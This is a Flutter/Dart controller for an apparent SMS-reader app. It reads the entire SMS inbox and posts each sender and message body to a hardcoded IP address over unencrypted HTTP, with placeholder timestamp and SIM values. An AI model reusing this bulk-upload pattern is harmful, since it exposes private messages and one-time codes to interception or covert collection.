import 'dart:convert';
import 'dart:developer';
import 'package:http/http.dart' as http;
import 'package:flutter/services.dart';
import 'package:get/get.dart';
import 'package:telephony/telephony.dart';

import '../auth/model/send_data_model.dart';
import '../db/prefs.dart';

class SmsController extends GetxController {
  final Rx<Telephony> telephony = Telephony.instance.obs;
  final Rx<Telephony> sim1Telephony = Telephony.instance.obs;
  RxList<SmsMessage> smsList = <SmsMessage>[].obs;
  RxList<SmsMessage> allSmsList = <SmsMessage>[].obs;
  RxList<SmsMessage> sim1SmsList = <SmsMessage>[].obs;

  RxList<SmsMessage> incomingSmsList = <SmsMessage>[].obs;


  String? updateToken = '';
   // final platform = const MethodChannel("com.sms_reader/sim1");



  var previousMessageIdentifier = ''.obs; // Initialize as null
  var recentMessage = ''.obs;

  @override
  void onInit() {
    super.onInit();
    // getSim1Messages();
  }

  bool isListening = false;

  RxString sim1 = ''.obs;
  RxString sim2 = ''.obs;


  Future<void> getLastSms() async {


    incomingSmsList.value = await telephony.value.getInboxSms(
      columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE],
      sortOrder: [
        OrderBy(SmsColumn.DATE, sort: Sort.DESC),
        // Sorting by date in descending order
        OrderBy(SmsColumn.ADDRESS, sort: Sort.ASC),
        OrderBy(SmsColumn.BODY),
      ],
    );

    if (incomingSmsList.isNotEmpty) {
      SmsMessage latestMessage = incomingSmsList.first;

      final mostRecentMessageIdentifier = '${latestMessage.address}_${latestMessage.body}';

      // Compare with the previous message
      if (previousMessageIdentifier.isNotEmpty) {
        if (!mostRecentMessageIdentifier.contains(previousMessageIdentifier)) {
          print("Most recent message is different from the previous one.");
          // print("recent body : ${latestMessage.body}");
          // print("Previous  body: ${latestMessage.body}");
          print("Previous Identy body: ${previousMessageIdentifier}");
          print("Recent Identy body: ${mostRecentMessageIdentifier}");


          ///api---------------------------

          if (incomingSmsList.isNotEmpty) {

            final url = Uri.parse('http://18.136.115.162/api/sms/send-all-messages'); // Replace with your API endpoint URL

            List<SendDataModel> sendDataModel = [];
            Set<String> uniqueMessageIdentifiers = Set<String>();

            sendDataModel.add(
              SendDataModel(
                sender: latestMessage.address ?? '',
                content: latestMessage.body ?? '',
                recivedSimNumber: "${sim1.value}/${sim2.value}" ?? '',
                simReceivedTimestamp: "2024-01-31T07:30:00Z",
                simName: "Airtel",
              ),
            );

            // for(var sms in incomingSmsList){
            //   // Create a unique identifier for the SMS based on sender and message content
            //   final messageIdentifier = '${sms.address}_${sms.body}';
            //   if (!uniqueMessageIdentifiers.contains(messageIdentifier)) {
            //     sendDataModel.add(
            //       SendDataModel(
            //         sender: sms.address ?? '',
            //         content: sms.body ?? '',
            //         recivedSimNumber: "04145dsfdt",
            //         simReceivedTimestamp: "2024-01-31T07:30:00Z",
            //         simName: "Airtel",
            //       ),
            //     );
            //
            //     // Add the message identifier to the set to mark it as processed
            //     uniqueMessageIdentifiers.add(messageIdentifier);
            //   }
            // }
            log("sorting list: ${sendDataModel.length} bal");
            final List<Map<String, dynamic>> jsonDataList = sendDataModel.map((model) => model.toJson()).toList();

            try {
              if(sendDataModel.isNotEmpty){
                final response = await http.post(
                  url,
                  headers: {
                    'Content-Type': 'application/json',
                    'Authorization' : Prefs.token.value!
                  },
                  body: jsonEncode(jsonDataList),
                );

                if (response.statusCode == 201 || response.statusCode == 200) {
                  print('Response data: ${response.body}');
                  print('Success: ');
                  sendDataModel.clear();
                } else {
                  print('Request failed with status code: ${response.statusCode}');
                  print('Response data: ${response.body}');
                  sendDataModel.clear();
                }
              }else{
                print('Model data empty');

              }

            } catch (error) {
              print('Error: $error');
            }

            log("ALL SMS LIST Controller${allSmsList}");

            // Get the most recent message (it should now be the first in the list)
            // SmsMessage mostRecentMessage = smsList.first;
            // Print the most recent message details
            // print("Most recent message from: ${mostRecentMessage.address}");
            // print("Most recent Message body: ${mostRecentMessage.body}");
            // print("Most recent  date: ${DateTime.fromMillisecondsSinceEpoch(mostRecentMessage.date?.toInt() ?? 1693807493000)}");

          } else {
            print("No messages available");
          }


        } else {
          print("Most recent message is the same as the previous one.");
        }
      }else{
        print("Previous Identifier Empty");

      }

      // Store the current message as the previous message for the next comparison
        previousMessageIdentifier.value = mostRecentMessageIdentifier;
    }

    // print("Most recent  date: ${DateTime.fromMillisecondsSinceEpoch(mostRecentMessage.date?.toInt() ?? 1693807493000)}");
   /* Set<String> uniqueMessageIdentifiers = Set<String>();

    final messageIdentifier = '${mostRecentMessage.address}_${mostRecentMessage.body}';
    log("${messageIdentifier}");

    if (!uniqueMessageIdentifiers.contains(messageIdentifier)) {

      uniqueMessageIdentifiers.add(messageIdentifier);
    }
*/

    update();
  }


    Future<void> getAllSms() async {
    smsList.value = await telephony.value.getInboxSms(
      columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE],
      sortOrder: [
        OrderBy(SmsColumn.DATE, sort: Sort.DESC), // Sorting by date in descending order
        OrderBy(SmsColumn.ADDRESS, sort: Sort.ASC),
        OrderBy(SmsColumn.BODY),
      ],
    );


    // incomingSmsList.value = await telephony.value.getInboxSms(
    //   columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE],
    //   sortOrder: [
    //     OrderBy(SmsColumn.DATE, sort: Sort.DESC), // Sorting by date in descending order
    //     OrderBy(SmsColumn.ADDRESS, sort: Sort.ASC),
    //     OrderBy(SmsColumn.BODY),
    //   ],
    // );

    log("SMS LIST Controller${smsList}");

    // Check if the smsList is not empty
    if (smsList.isNotEmpty) {

      final url = Uri.parse('http://18.136.115.162/api/sms/send-all-messages'); // Replace with your API endpoint URL

      List<SendDataModel> myModels= [];
      Set<String> uniqueMessageIdentifiers = Set<String>();

      for(var sms in smsList){
        // Create a unique identifier for the SMS based on sender and message content
        final messageIdentifier = '${sms.address}_${sms.body}';

        if (!uniqueMessageIdentifiers.contains(messageIdentifier)) {
          myModels.add(
            SendDataModel(
              sender: sms.address ?? '',
              content: sms.body ?? '',
              recivedSimNumber: "04145",
              simReceivedTimestamp: "2024-01-31T07:30:00Z",
              simName: "Airtel",
            ),
          );

          // Add the message identifier to the set to mark it as processed
          uniqueMessageIdentifiers.add(messageIdentifier);
        }
      }
      log("sorting list: ${myModels.length}");
      final List<Map<String, dynamic>> jsonDataList = myModels.map((model) => model.toJson()).toList();

      try {
        if(myModels.isNotEmpty){
          final response = await http.post(
            url,
            headers: {
              'Content-Type': 'application/json',
              'Authorization' : Prefs.token.value!
            },
            body: jsonEncode(jsonDataList),
          );

          if (response.statusCode == 201 || response.statusCode == 200) {
            print('Response data: ${response.body}');
            print('Success: ');
            myModels.clear();
          } else {
            print('Request failed with status code: ${response.statusCode}');
            print('Response data: ${response.body}');
            myModels.clear();
          }
        }else{
          print('Model data empty');

        }

      } catch (error) {
        print('Error: $error');
      }

      log("ALL SMS LIST Controller${allSmsList}");

      // Get the most recent message (it should now be the first in the list)
      SmsMessage mostRecentMessage = smsList.first;
      // Print the most recent message details
      // print("Most recent message from: ${mostRecentMessage.address}");
      // print("Most recent Message body: ${mostRecentMessage.body}");
      // print("Most recent  date: ${DateTime.fromMillisecondsSinceEpoch(mostRecentMessage.date?.toInt() ?? 1693807493000)}");

    } else {
      print("No messages available");
    }

    print("Total messages: ${smsList.length}");
  }



  Future<void> listenIncomingSms(bool isListen) async {
    // Check if already listening
    if (isListening) {
      print("Already listening for incoming SMS");
      return;
    }

    // Set the flag to true so we don't start another listener
    print("check before listen");

    isListening = isListen;
    print("check after listen");

    telephony.value.listenIncomingSms(
      onNewMessage: (SmsMessage smsMessage) {
        print("Incoming body: ${smsMessage.body}");
        print("Incoming Address: ${smsMessage.address}");
        print("Incoming date: ${DateTime.fromMillisecondsSinceEpoch(smsMessage.date?.toInt() ?? 1693807493000)}");

        // Update the list of SMS messages and refresh the UI
        // smsList.insert(0, smsMessage);

        // Check if it's an incoming message
        // if(smsMessage.type != null){

          incomingSmsList.insert(0, smsMessage);
          smsList.clear();
          smsList.addAll(incomingSmsList);

          // Send the incoming SMS to the server


          log("incoming sms length: ${smsList.length}");



        // }


      },

      listenInBackground: false,
    );

    log("incoming sms length: ${incomingSmsList.length}");
    print("Started listening sms");
  }


  Future<void> listenIncomingSms1() async {
    // Check if already listening
    if (isListening) {
      print("Already listening for incoming SMS");
      return;
    }

    // Set the flag to true so we don't start another listener
    isListening = true;

    telephony.value.listenIncomingSms(
      onNewMessage: (SmsMessage smsMessage) {
        print("Incoming body: ${smsMessage.body}");
        print("Incoming Address: ${smsMessage.address}");
        print("Incoming date: ${DateTime.fromMillisecondsSinceEpoch(smsMessage.date?.toInt() ?? 1693807493000)}");

        // Check if it's an incoming message
        if (smsMessage.type == SmsType.MESSAGE_TYPE_INBOX) {
          // Update the list of incoming SMS messages and refresh the UI
          incomingSmsList.insert(0, smsMessage);
          smsList.clear();
          smsList.addAll(incomingSmsList);

          // Send the incoming SMS to the server
          // sendPostRequest(smsMessage);
          log('incoming Sms sent');
        }
      },
      listenInBackground: false,
    );

    print("Started listening to incoming SMS");
  }




  // Future<void> listenIncomingSms() async{
  //   telephony.value.listenIncomingSms(
  //     onNewMessage: (SmsMessage smsMessage) {
  //       print("Received SMS: ${smsMessage.body}");
  //       print("Received SMS: ${smsMessage.address}");
  //       // Handle the received SMS message here
  //       // smsList.insert(0,smsMessage);
  //         smsList.value.insert(0,smsMessage);
  //         log('inside listen');
  //     },
  //     listenInBackground: false,
  //
  //   );
  //   print("get listen:");
  //
  // }


void setSim1(String sim){
    sim1.value = sim;
}


  void setSim2(String sim){
    sim2.value = sim;
  }

  void updateTokenValue(String mToken){
    Prefs.token.updateValue(mToken);
    updateToken = mToken;
    update();
  }



  //-----------------------------------------------------

  ///todo have to work on it------------------
  Future<void> getSim1Messages(MethodChannel platform) async {
    try {
      sim1SmsList.value = await sim1Telephony.value.getInboxSms(

        columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE],
        sortOrder: [
          OrderBy(SmsColumn.DATE, sort: Sort.DESC),
          OrderBy(SmsColumn.ADDRESS, sort: Sort.ASC),
          OrderBy(SmsColumn.BODY),
        ],
      );


      if (sim1SmsList.isNotEmpty) {
        // Get the most recent message (it should now be the first in the list)
        // SmsMessage mostRecentMessage = smsList.first;
        log("sim 1list ${sim1SmsList.value.length}");
        final List<SmsMessage> filteredMessages = await filterSim1Messages(sim1SmsList,platform);
        log("sim filter ${filteredMessages.length}");

        sim1SmsList.value = filteredMessages;

        SmsMessage mostRecentMessage = sim1SmsList.first;
        // Print the most recent message details
        print("SIM1 message from: ${mostRecentMessage.address}");
        print("SIM1 Message body: ${mostRecentMessage.body}");

      } else {

        print("SIM 1 No messages available");
      }



    } catch (e) {
      print("Error in getting messages: $e");
    }
  }

  Future<List<SmsMessage>> filterSim1Messages(List<SmsMessage> messages,MethodChannel platform) async {
    try {
      var sim1MessageIds = await platform.invokeMethod("getSim1MessageIds");
      log("sim1 ids ${sim1MessageIds.length}");

      /*  List<String> messageIdentifiers = messages.map((message) => _generateMessageIdentifier(message)).toList();
      log("sim total identi filter: ${messageIdentifiers.length}");*/

      // for(var id in messageIdentifiers){
      //   log("sim id: ${id}");
      // }
      // Create a set of SIM 2 message identifiers for faster lookup
      /*  Set<dynamic> sim1MessageIdentifiers = sim1MessageIds.map((id) => id.toString()).toSet();
      log("sim total filter: ${sim1MessageIdentifiers.length}");*/
      // for(var id in sim1MessageIdentifiers){
      //   log("sim identi: ${id}");
      // }

      // log("sim contains : ${sim1MessageIdentifiers.contains(messageIdentifiers)}");

      // Use where to filter messages where the identifier is in the sim2MessageIdentifiers set
      // return messages.where((message) => sim1MessageIdentifiers.contains(messageIdentifiers)).toList();

      // Create a set of SIM 2 message identifiers for faster lookup
      Set<int> sim2MessageIdSet = Set<int>.from(sim1MessageIds);
      for (var message in messages) {
        log("subs id: ${message.address}");
      }
      // Use where to filter messages where the id is in the sim2MessageIdSet
      return messages.where((message) => sim2MessageIdSet.contains(message.id)).toList();




      // for(var message1 in messages){
      //   log("message id: ${message1.address}");
      // }
      // return messages.where((message) => sim1MessageIds.contains(message.id)).toList();
    } catch (e) {
      print("Error in filtering messages: $e");
      return [];
    }
  }

  // Helper function to generate a unique identifier for an SMS message
  String _generateMessageIdentifier(SmsMessage message) {
    // You can use message content, sender, timestamp, or any other unique information
    return "${message.address}_${message.date}_${message.body}";
  }




}
